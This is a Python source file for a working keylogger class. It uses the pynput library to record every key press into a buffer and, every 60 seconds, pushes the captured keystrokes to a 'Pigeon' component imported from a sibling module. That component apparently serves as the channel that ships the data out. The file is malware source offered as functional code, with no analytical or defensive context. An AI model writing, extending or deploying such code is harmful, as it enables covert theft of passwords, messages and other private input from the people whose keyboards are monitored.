from .pigeon import Pigeon
from pynput import keyboard
from time import sleep


class keylogger:
    def __init__(self, interval: int = 60) -> None:
        self.buffer = ""
        self.updateInt = interval
        self.listener = keyboard.Listener(
            on_press=self.onPressCallback,
        )

    def onPressCallback(self, key) -> None:
        if key == None:
            return
        try:
            self.buffer += key.char
        except AttributeError:
            self.buffer += "[{}]".format(str(key)[4:])
        except TypeError:
            return

    def startService(self) -> None:
        self.listener.start()
        while self.listener.is_alive():
            sleep(self.updateInt)
            Pigeon.pushToBuffer("keylog", self.buffer)
            self.buffer = ""

    def stopService(self) -> None:
        self.listener.stop()
